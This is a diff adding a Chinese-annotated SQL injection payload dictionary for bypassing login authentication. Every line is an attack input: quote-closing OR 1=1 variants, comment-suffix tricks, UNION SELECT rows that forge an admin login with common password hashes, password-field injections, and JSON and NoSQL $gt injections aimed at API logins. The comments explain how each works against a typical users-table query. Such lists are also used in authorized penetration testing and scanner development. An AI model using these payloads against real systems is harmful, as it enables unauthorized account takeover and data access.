@@ -1,0 +1,90 @@
+# ============================================================
+# SQL Injection Payload Dictionary — 08 登录绕过类
+# 用途: 绕过登录表单的身份验证
+# 适用: 后台查询类似 SELECT * FROM users WHERE username='xxx' AND password='xxx'
+# 原理: 通过闭合引号 + OR 1=1 使 WHERE 条件恒真
+# ============================================================
+
+# ========== 用户名注入（经典绕过）==========
+admin' OR '1'='1
+admin' OR '1'='1'--
+admin' OR 1=1--
+admin' OR 1=1#
+admin' OR '1'='1'#
+admin" OR "1"="1
+admin" OR 1=1--
+admin') OR ('1'='1
+admin') OR 1=1--
+admin") OR ("1"="1
+admin" OR 1=1--
+admin'--
+admin' #
+
+# ========== 仅注入用户名，密码任意 ==========
+admin'--
+admin' #
+admin'--
+admin'--
+
+# ========== 空用户+空密码 ==========
+' OR 1=1--
+' OR 1=1#
+" OR 1=1--
+' OR '1'='1
+" OR "1"="1
+' OR '1'='1'--
+" OR "1"="1"--
+'or'1=1
+'or'1=1'--
+') OR ('1'='1
+') OR 1=1--
+
+# ========== 带括号绕过 ==========
+') OR 1=1--
+') OR '1'='1'--
+")) OR 1=1--
+")) OR ("1"="1--
+
+# ========== SQL Server 登录绕过 ==========
+admin'--
+admin'--
+admin' OR 1=1--
+
+# ========== 注释绕过后缀 ==========
+admin'--
+admin'/*
+admin'-- -
+admin'#
+
+# ========== UNION 伪造登录 ==========
+# 注意: 需要知道列数，替换 N 为实际列数
+' UNION SELECT 1,1,N--
+' UNION SELECT 'admin','admin',N--
+' UNION SELECT 1,'admin','password',N--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,'admin','81dc9bdb52d04dc20036dbd8313ed055',N--
+' UNION SELECT 1,'admin','5f4dcc3b5aa765d61d8327deb882cf99',N--
+
+# ========== 密码字段注入 ==========
+# 如果密码框是单独的输入点
+' OR 1=1
+' OR '1'='1
+' OR 1=1--
+' OR '1'='1'--
+" OR "1"="1
+" OR 1=1--
+
+# ========== 多参数组合 ==========
+# 用户名: admin'--
+# 密码: 任意
+
+# 用户名: ' OR 1=1--
+# 密码: ' OR 1=1--
+
+# 用户名: admin
+# 密码: ' OR 1=1--
+
+# ========== JSON 注入（API 场景）===========
+{"username": "admin' OR '1'='1", "password": "test"}
+{"username": "admin'--", "password": "test"}
+{"username": {"$gt":""}, "password": {"$gt":""}}
